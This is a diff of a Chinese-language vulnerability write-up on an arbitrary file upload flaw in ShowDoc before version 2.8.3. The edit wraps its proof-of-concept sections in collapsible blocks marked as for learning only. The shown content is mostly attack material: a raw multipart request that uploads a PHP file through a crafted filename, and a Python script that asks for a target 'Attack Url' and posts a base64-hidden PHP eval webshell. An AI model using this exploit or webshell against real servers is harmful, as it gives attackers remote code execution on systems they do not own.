@@ -25,8 +25,10 @@ ShowDoc < V2.8.3
 
 ```
 app="ShowDoc"
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 网站首页如下
@@ -48,12 +50,13 @@ Content-Type: multipart/form-data; boundary=--------------------------9213781263
 Accept-Encoding: gzip
 
 ----------------------------921378126371623762173617
-Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+Content-Disposition: form-data; name="editormd-image-file"; filename="test.&lt;&gt;php"
 Content-Type: text/plain
 
-<?php phpinfo();?>
-----------------------------921378126371623762173617--
-```
+&lt;?php phpinfo();?&gt;
+----------------------------921378126371623762173617--</code></pre>
+
+</details>
 
 
 
@@ -69,8 +72,10 @@ Content-Type: text/plain
 
 ## 漏洞POC
 
-```python
-import requests
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-python">import requests
 import sys
 import random
 import base64
@@ -81,7 +86,7 @@ def title():
     print('+------------------------------------------')
     print('+  \033[34mTitle: ShowDoc 任意文件上传漏洞                                       \033[0m')
     print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
-    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
+    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
     print('+------------------------------------------')
 
 def POC_1(target_url):
@@ -90,7 +95,7 @@ def POC_1(target_url):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
             "Content-Type": "multipart/form-data; boundary=--------------------------921378126371623762173617"
     }
-    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=")
+    data = &#98;ase64.&#98;64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=")
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
@@ -112,9 +117,10 @@ def POC_1(target_url):
 
 if __name__ == '__main__':
     title()
-    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
-    POC_1(target_url)
-```
+    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
+    POC_1(target_url)</code></pre>
+
+</details>
 
 ---
 
